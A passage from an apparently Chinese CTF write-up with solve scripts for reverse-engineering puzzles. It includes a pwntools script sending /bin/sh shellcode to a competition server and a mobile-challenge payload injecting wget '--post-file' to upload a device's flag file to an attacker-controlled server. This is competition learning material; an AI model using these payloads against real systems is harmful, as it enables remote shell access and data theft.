  (R1_NEW, x1) = lfsr(R1, R1_mask)</span><br><span class="line">    (R2_NEW, x2) = lfsr(R2, R2_mask)</span><br><span class="line">    (R3_NEW, x3) = lfsr(R3, R3_mask)</span><br><span class="line">    <span class="keyword">if</span>(x1&amp;<span class="number">1</span>):</span><br><span class="line">        out = x3</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out = x2</span><br><span class="line">    <span class="keyword">return</span> (R1_NEW, R2_NEW, R3_NEW, out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R1_mask = <span class="number">0x17fa06</span></span><br><span class="line">R2_mask = <span class="number">0x2a9a0d</span></span><br><span class="line">R3_mask = <span class="number">0x5e5e6a</span></span><br><span class="line">n1 = <span class="number">21</span></span><br><span class="line">n2 = <span class="number">22</span></span><br><span class="line">n3 = <span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(beg, end, num, mask)</span>:</span></span><br><span class="line">    ansn = range(beg, end)</span><br><span class="line">    data = open(<span class="string">'./output'</span>).read(num)</span><br><span class="line">    data = <span class="string">''</span>.join(bin(<span class="number">256</span> + ord(c))[<span class="number">3</span>:] <span class="keyword">for</span> c <span class="keyword">in</span> data)</span><br><span class="line">    now = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ansn:</span><br><span class="line">        r = i</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(num * <span class="number">8</span>):</span><br><span class="line">            r, lastbit = lfsr(r, mask)</span><br><span class="line">            lastbit = str(lastbit)</span><br><span class="line">            cnt += (lastbit == data[j])</span><br><span class="line">        <span class="keyword">if</span> cnt &gt; now:</span><br><span class="line">            now = cnt</span><br><span class="line">            res = i</span><br><span class="line">            <span class="keyword">print</span> now, res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce2</span><span class="params">(y, z)</span>:</span></span><br><span class="line">    data = open(<span class="string">'./output'</span>).read(<span class="number">50</span>)</span><br><span class="line">    data = <span class="string">''</span>.join(bin(<span class="number">256</span> + ord(c))[<span class="number">3</span>:] <span class="keyword">for</span> c <span class="keyword">in</span> data)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(pow(<span class="number">2</span>, n1 - <span class="number">1</span>), pow(<span class="number">2</span>, n1)):</span><br><span class="line">        R1, R2, R3 = x, y, z</span><br><span class="line">        flag = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">            (R1, R2, R3,</span><br><span class="line">             out) = single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask)</span><br><span class="line">            <span class="keyword">if</span> str(out) != data[i]:</span><br><span class="line">                flag = <span class="keyword">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> y % <span class="number">10000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'now: '</span>, x, y, z</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'ans: '</span>, hex(x)[<span class="number">2</span>:], hex(y)[<span class="number">2</span>:], hex(z)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R2 = guess(pow(<span class="number">2</span>, n2 - <span class="number">1</span>), pow(<span class="number">2</span>, n2), <span class="number">40</span>, R2_mask)</span><br><span class="line"><span class="keyword">print</span> R2</span><br><span class="line">R3 = guess(pow(<span class="number">2</span>, n3 - <span class="number">1</span>), pow(<span class="number">2</span>, n3), <span class="number">40</span>, R3_mask)</span><br><span class="line"><span class="keyword">print</span> R3</span><br><span class="line">R2 = <span class="number">3324079</span></span><br><span class="line">R3 = <span class="number">4958299</span></span><br><span class="line">bruteforce2(R2, R3)</span><br></pre></td></tr></table></figure><h2><span id="cycle-graph">cycle graph</span></h2><p>图算法，先按可见字符过滤，后来猜测0-9，a-f，多个的穷举</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x00000034</span>, <span class="number">0x00403398</span>, <span class="number">0x0040338C</span>, <span class="number">0x00000002</span>, <span class="number">0x00403398</span>, <span class="number">0x004033E0</span>, <span class="number">0x0000002C</span>, <span class="number">0x0040338C</span>,</span><br><span class="line"><span class="number">0x004033D4</span>, <span class="number">0x0000002A</span>, <span class="number">0x00403458</span>, <span class="number">0x00403494</span>, <span class="number">0x00000006</span>, <span class="number">0x004033D4</span>, <span class="number">0x004033EC</span>, <span class="number">0x0000002A</span>,</span><br><span class="line"><span class="number">0x00403398</span>, <span class="number">0x00403464</span>, <span class="number">0x0000002F</span>, <span class="number">0x004034B8</span>, <span class="number">0x004034F4</span>, <span class="number">0x0000002A</span>, <span class="number">0x0040341C</span>, <span class="number">0x00403494</span>,</span><br><span class="line"><span class="number">0x00000033</span>, <span class="number">0x004033B0</span>, <span class="number">0x004033EC</span>, <span class="number">0x00000003</span>, <span class="number">0x004033F8</span>, <span class="number">0x0040341C</span>, <span class="number">0x00000002</span>, <span class="number">0x004033B0</span>,</span><br><span class="line"><span class="number">0x00403410</span>, <span class="number">0x00000032</span>, <span class="number">0x0040347C</span>, <span class="number">0x004034DC</span>, <span class="number">0x00000032</span>, <span class="number">0x00403428</span>, <span class="number">0x004033F8</span>, <span class="number">0x00000032</span>,</span><br><span class="line"><span class="number">0x0040338C</span>, <span class="number">0x004034A0</span>, <span class="number">0x00000030</span>, <span class="number">0x00403380</span>, <span class="number">0x004033EC</span>, <span class="number">0x00000003</span>, <span class="number">0x00403428</span>, <span class="number">0x004034A0</span>,</span><br><span class="line"><span class="number">0x00000001</span>, <span class="number">0x004033BC</span>, <span class="number">0x004034AC</span>, <span class="number">0x00000032</span>, <span class="number">0x004033D4</span>, <span class="number">0x004033EC</span>, <span class="number">0x0000002B</span>, <span class="number">0x004034D0</span>,</span><br><span class="line"><span class="number">0x004034B8</span>, <span class="number">0x00000002</span>, <span class="number">0x00403410</span>, <span class="number">0x004033A4</span>, <span class="number">0x0000002E</span>, <span class="number">0x004034D0</span>, <span class="number">0x00403488</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00403434</span>, <span class="number">0x004033C8</span>, <span class="number">0x00000002</span>, <span class="number">0x00403434</span>, <span class="number">0x0040344C</span>, <span class="number">0x0000002D</span>, <span class="number">0x00403398</span>, <span class="number">0x0040341C</span>,</span><br><span class="line"><span class="number">0x00000032</span>, <span class="number">0x00403440</span>, <span class="number">0x004033D4</span>, <span class="number">0x00000004</span>, <span class="number">0x00403494</span>, <span class="number">0x00403434</span>, <span class="number">0x0000002D</span>, <span class="number">0x004034E8</span>,</span><br><span class="line"><span class="number">0x00403470</span>, <span class="number">0x00000030</span>, <span class="number">0x00403494</span>, <span class="number">0x0040338C</span>, <span class="number">0x00000031</span>, <span class="number">0x00403464</span>, <span class="number">0x00403440</span>, <span class="number">0x0000002F</span>,</span><br><span class="line"><span class="number">0x004033EC</span>, <span class="number">0x004033B0</span>, <span class="number">0x00000033</span>, <span class="number">0x00403488</span>, <span class="number">0x00403404</span>, <span class="number">0x00000005</span>, <span class="number">0x004034F4</span>, <span class="number">0x004034F4</span>]</span><br><span class="line">node = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    </span><br><span class="line">    data[i*<span class="number">3</span>+<span class="number">1</span>] -= <span class="number">0x00403380</span></span><br><span class="line">    data[i*<span class="number">3</span>+<span class="number">1</span>] //= <span class="number">12</span></span><br><span class="line">    data[i*<span class="number">3</span>+<span class="number">2</span>] -= <span class="number">0x00403380</span></span><br><span class="line">    data[i*<span class="number">3</span>+<span class="number">2</span>] //= <span class="number">12</span></span><br><span class="line">    tmp = [data[<span class="number">3</span>*i], data[i*<span class="number">3</span>+<span class="number">1</span>], data[i*<span class="number">3</span>+<span class="number">2</span>]]</span><br><span class="line">    node.append(tmp)</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">delta = <span class="number">48</span></span><br><span class="line">res = []</span><br><span class="line">res.append(node[p][<span class="number">0</span>]+<span class="number">48</span>)</span><br><span class="line">delta = node[p][<span class="number">0</span>]+<span class="number">48</span></span><br><span class="line">p = node[p][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">digit = list(<span class="string">b"0123456789abcdef"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span> delta + node[p][<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> digit:</span><br><span class="line">        delta = delta - node[p][<span class="number">0</span>]</span><br><span class="line">        res.append(delta)</span><br><span class="line">        p = node[p][<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> delta - node[p][<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> digit:</span><br><span class="line">        delta = delta + node[p][<span class="number">0</span>]</span><br><span class="line">        res.append(delta)</span><br><span class="line">        p = node[p][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(p, delta, node[p], i)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">            delta = delta + node[p][<span class="number">0</span>]</span><br><span class="line">            res.append(delta)</span><br><span class="line">            p = node[p][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">12</span>:</span><br><span class="line">            delta = delta - node[p][<span class="number">0</span>]</span><br><span class="line">            res.append(delta)</span><br><span class="line">            p = node[p][<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            delta = delta + node[p][0]</span></span><br><span class="line"><span class="string">            res.append(delta)</span></span><br><span class="line"><span class="string">            p = node[p][1]</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            delta = delta - node[p][0]</span></span><br><span class="line"><span class="string">            res.append(delta)</span></span><br><span class="line"><span class="string">            p = node[p][2]</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line">print(bytes(res))</span><br></pre></td></tr></table></figure><h2><span id="天津垓">天津垓</span></h2><p>smc，加密比较简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">17</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">3</span>, <span class="number">47</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">16</span>]</span><br><span class="line">key = list(<span class="string">b"Rising_Hopper!"</span>)</span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    plain.append(cipher[i]^key[i%<span class="number">14</span>])</span><br><span class="line">print(bytes(plain))</span><br><span class="line"><span class="comment"># Caucasus@s_ability</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">0x1EA272</span>, <span class="number">0x206FC4</span>, <span class="number">0x1D2203</span>, <span class="number">0x1EEF55</span>, <span class="number">2421009</span>, <span class="number">0x193A7C</span>, <span class="number">0x1F3C38</span>, <span class="number">2184813</span>, <span class="number">2302911</span>, <span class="number">2263545</span>, <span class="number">1909251</span>, <span class="number">2165130</span>, <span class="number">1968300</span>, <span class="number">2243862</span>, <span class="number">2066715</span>, <span class="number">2322594</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">1869885</span>, <span class="number">2066715</span>, <span class="number">2263545</span>, <span class="number">1869885</span>, <span class="number">964467</span>, <span class="number">944784</span>, <span class="number">944784</span>, <span class="number">944784</span>, <span class="number">728271</span>, <span class="number">1869885</span>, <span class="number">2263545</span>, <span class="number">2283228</span>, <span class="number">2243862</span>, <span class="number">2184813</span>, <span class="number">2165130</span>, <span class="number">2027349</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">1869885</span>, <span class="number">2283228</span>, <span class="number">2047032</span>, <span class="number">1909251</span>, <span class="number">2165130</span>, <span class="number">1869885</span>, <span class="number">2401326</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">2184813</span>, <span class="number">885735</span>, <span class="number">2184813</span>, <span class="number">2165130</span>, <span class="number">1987983</span>, <span class="number">2460375</span>]</span><br><span class="line"></span><br><span class="line">mul = <span class="number">19683</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">51</span>):</span><br><span class="line">    res[i] //= mul</span><br><span class="line">print(bytes(res))</span><br></pre></td></tr></table></figure><h2><span id="easyparser">easyparser</span></h2><p>虚拟机题，init和fini还有另外几部分虚拟机，加密比较简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = [<span class="number">0x90</span>, <span class="number">0x14C</span>, <span class="number">0x1C</span>, <span class="number">0xF0</span>, <span class="number">0x84</span>, <span class="number">0x3C</span>, <span class="number">0x18</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0xF0</span>, <span class="number">0xD0</span>, <span class="number">0x58</span>, <span class="number">0x2C</span>, <span class="number">0x8</span>, <span class="number">0x34</span>, <span class="number">0xF0</span>, <span class="number">0x114</span>, <span class="number">0xF0</span>, <span class="number">0x80</span>, <span class="number">0x2C</span>, <span class="number">0x28</span>, <span class="number">0x34</span>, <span class="number">0x8</span>, <span class="number">0xF0</span>, <span class="number">0x90</span>, <span class="number">0x44</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x5C</span>, <span class="number">0x2C</span>, <span class="number">0x108</span>, <span class="number">0xF0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    res[i] &gt;&gt;= <span class="number">2</span></span><br><span class="line">    res[i] ^= <span class="number">0x63</span></span><br><span class="line">print(bytes(res))</span><br></pre></td></tr></table></figure><h2><span id="rubik">Rubik</span></h2><p>二阶魔方，两个int64存放面，每三个bit代表一面的颜色</p><p>构造各种输入得到三个bit对应的颜色和位置，用在线求解器求解</p><p>http://rubiks-cube-solver.com/2x2/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"># 0   0   0    4   4  3</span><br><span class="line"># 0   0   5    4   2  3</span><br><span class="line"># 0   0   3    0   2  2</span><br><span class="line"># 0   0   0    0   0  0</span><br><span class="line"># 5   5   2    5   4  4</span><br><span class="line"># 5   1   2    5   0  0</span><br><span class="line"># 5   1   3    5   5  5</span><br><span class="line"># 5   5   5    5   5  5</span><br><span class="line"># 4   5   1    4   4  4</span><br><span class="line"># 4   5   1    3   3  5</span><br><span class="line"># 4   4   4    3   3  1</span><br><span class="line"># 4   4   4    4   4  4</span><br><span class="line"># 3   3   0    3   5  5</span><br><span class="line"># 3   3   2    1   5  0</span><br><span class="line"># 3   3   5    1   1  1</span><br><span class="line"># 3   3   5    3   3  3</span><br><span class="line"># 2   4   0    2   2  3</span><br><span class="line"># 2   4   3    2   3  1</span><br><span class="line"># 2   2   3    2   1  2</span><br><span class="line"># 2   2   2    2   2  2</span><br><span class="line"># 1   1   4    0   0  4</span><br><span class="line"># 1   2   4    0   1  2</span><br><span class="line"># 1   2   1    1   1  1</span><br><span class="line"># 1   1   1    1   0  0</span><br><span class="line">    # U   FUUF R   RF RFR</span><br><span class="line"></span><br><span class="line"># 0 white</span><br><span class="line"># 1 orange</span><br><span class="line"># 2 blue</span><br><span class="line"># 3 yellow</span><br><span class="line"># 4 red</span><br><span class="line"># 5 green</span><br><span class="line"></span><br><span class="line">       # 15 14</span><br><span class="line">       # 12 13</span><br><span class="line">       </span><br><span class="line"># 06 05  22 21  17 16  09 08</span><br><span class="line"># 07 04  23 20  18 19  10 11</span><br><span class="line"></span><br><span class="line">       # 02 01</span><br><span class="line">       # 03 00</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">color = [<span class="string">'white'</span>, <span class="string">'orange'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>, <span class="string">'red'</span>, <span class="string">'green'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">breakdown</span><span class="params">(cube)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    tmp = cube</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">        res.append(color[tmp&amp;<span class="number">0b111</span>])</span><br><span class="line">        tmp &gt;&gt;= <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> res[::<span class="number">-1</span>]</span><br><span class="line">res = breakdown(<span class="number">0x64056d754259894604</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    print(i, res[i])</span><br></pre></td></tr></table></figure><h2><span id="babywasi">babywasi</span></h2><p>elf调用wasm</p><p>给一个随机数，加密发送的shellcode后运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f16</span><span class="params">(a1)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (a1 &amp;<span class="number">1</span> <span class="keyword">and</span> a1 %<span class="number">3</span>):</span><br><span class="line">        v3 = <span class="number">7</span></span><br><span class="line">        <span class="keyword">while</span>((v3<span class="number">-6</span>)*(v3<span class="number">-6</span>) &lt; a1):</span><br><span class="line">            <span class="keyword">assert</span> v3 != <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> (a1%(v3<span class="number">-2</span>)!=<span class="number">0</span>):</span><br><span class="line">                <span class="keyword">assert</span> v3 != <span class="number">0</span></span><br><span class="line">                v1 = a1 % v3</span><br><span class="line">                v3 += <span class="number">6</span></span><br><span class="line">                <span class="keyword">if</span> v1 != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse10</span><span class="params">(a1)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    tmp = a1</span><br><span class="line">    <span class="keyword">while</span>(tmp):</span><br><span class="line">        res = tmp % <span class="number">10</span> + res * <span class="number">10</span></span><br><span class="line">        tmp //= <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f18</span><span class="params">(a1)</span>:</span></span><br><span class="line">    v3 = reverse10(a1)</span><br><span class="line">    <span class="keyword">if</span> v3 != a1 <span class="keyword">and</span> f16(a1)!= <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">return</span> f16(v3) != <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f19</span><span class="params">(a1)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(sum&lt;a1+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> f18(i):</span><br><span class="line">            k = i</span><br><span class="line">            sum += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"121.37.164.32"</span>, <span class="number">19008</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"Your lucky number: "</span>)</span><br><span class="line">rand = int(p.recvline().strip())</span><br><span class="line">log.success(rand)</span><br><span class="line">s = <span class="string">b""</span></span><br><span class="line">shellcode = <span class="string">b"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    print(f19(rand+i), i)</span><br><span class="line">    s+=bytes([(f19(rand+i)&amp;<span class="number">0xff</span>)^shellcode[i]])</span><br><span class="line">log.success(s.ljust(<span class="number">64</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">p.send(s.ljust(<span class="number">64</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="fxck">fxck!</span></h2><p>base58，之后用brainfuck语言加密，但是代码可能写错了，每次加密的都是上一位的结果。修改之后的版本改为直接对比编码结果，解base58即可。</p><p>base58编码部分也有bug，存放结果的位置没有初始化为0，导致存放了一些垃圾数据，体现在解密后为06开头。位数短的话这里会是。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">tab = <span class="string">b'ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b58encode</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    num = bytes_to_long(s)</span><br><span class="line">    res = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">while</span>(num):</span><br><span class="line">        res = bytes([tab[num%<span class="number">58</span>]]) + res</span><br><span class="line">        num //= <span class="number">58</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b58decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    tmp = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[::<span class="number">-1</span>]:</span><br><span class="line">        tmp += bytes([tab.index(i)])</span><br><span class="line">    pow = <span class="number">1</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line">        res += pow*tmp[i]</span><br><span class="line">        pow *= <span class="number">58</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(res)[:]</span><br><span class="line"></span><br><span class="line">print(b58decode(<span class="string">b"4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe"</span>))</span><br></pre></td></tr></table></figure><h1><span id="mobile">mobile</span></h1><h2><span id="getflag">getflag</span></h2><p>socket一建立会告诉随机数，用这个随机数加密message后跟check校验。</p><p>有个secret.txt，告诉了ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The%20IP%20of%20the%20remote%20phone%20is%20212.64.66.177</span><br></pre></td></tr></table></figure><p>直接按程序的逻辑发包就行，注意文件的路径在apk包目录的文件下面，wget把文件读到远程服务器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line">p = remote(<span class="string">"212.64.66.177"</span>, <span class="string">"8080"</span>)</span><br><span class="line">key = p.recvline().strip()</span><br><span class="line">log.success(<span class="string">b"key: "</span>+key)</span><br><span class="line"></span><br><span class="line">message = <span class="string">b"[your server] --post-file=/data/data/com.xuanxuan.getflag/files/flag"</span></span><br><span class="line">hashed = hmac.new(key, message, sha1)</span><br><span class="line">check = hashed.hexdigest().encode()</span><br><span class="line">payload = <span class="string">b"&#123;\"message\":\""</span>+message+<span 